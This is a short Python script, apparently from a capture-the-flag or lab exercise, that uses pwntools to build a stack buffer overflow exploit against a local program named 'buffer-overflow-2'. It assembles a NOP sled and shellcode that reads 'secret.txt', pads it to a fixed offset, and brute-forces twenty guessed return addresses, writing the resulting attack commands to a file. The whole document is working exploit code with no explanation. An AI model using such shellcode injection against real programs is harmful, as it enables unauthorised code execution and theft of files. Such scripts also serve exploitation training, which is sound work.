from pwn import *

context.update(arch='amd64', os='linux')

nop = asm(shellcraft.nop())
code = asm(shellcraft.cat('secret.txt'))
program_name = "./buffer-overflow-2"
addr_offset = 163
addr = 0x00007fffffffe320 - 300

bytes = addr_offset - len(code)
sled = int(bytes / 2)
rem = bytes - sled

f = open("./output", "w")
lines = ""

for x in range(20):
    shc = nop * sled + code + nop * rem + p64(addr + x * 16)
    lines += f"""{program_name} ${str(shc)[1:]}\n"""

lines += "dmesg | tail -n 1\n"

f.write(lines)
f.close()
